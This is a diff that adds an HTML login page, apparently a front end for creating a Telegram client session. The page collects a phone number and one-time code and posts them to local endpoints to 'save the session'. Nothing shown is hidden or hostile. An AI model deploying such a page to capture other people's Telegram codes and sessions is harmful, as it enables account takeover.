@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head><title>Telegram Login</title></head>
+<body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
+    <h2>Telegram Web Authenticator</h2>
+    <div id="step1">
+        <input type="text" id="phone" placeholder="+62812xxx">
+        <button onclick="requestOTP()">Kirim OTP</button>
+    </div>
+    <div id="step2" style="display:none; margin-top:10px;">
+        <input type="text" id="otp" placeholder="Kode OTP">
+        <button onclick="login()">Verifikasi & Simpan Sesi</button>
+    </div>
+    <p id="status"></p>
+
+    <script>
+        async function requestOTP() {
+            const phone = document.getElementById('phone').value;
+            const res = await fetch('/send-otp', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({phone: phone})
+            });
+            const data = await res.json();
+            document.getElementById('status').innerText = data.message || data.error;
+            if(!data.error) document.getElementById('step2').style.display = 'block';
+        }
+
+        async function login() {
+            const phone = document.getElementById('phone').value;
+            const otp = document.getElementById('otp').value;
+            const res = await fetch('/verify-login', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({phone: phone, otp: otp})
+            });
+            const data = await res.json();
+            document.getElementById('status').innerText = data.message || data.error;
+        }
+    </script>
+</body>
+</html>
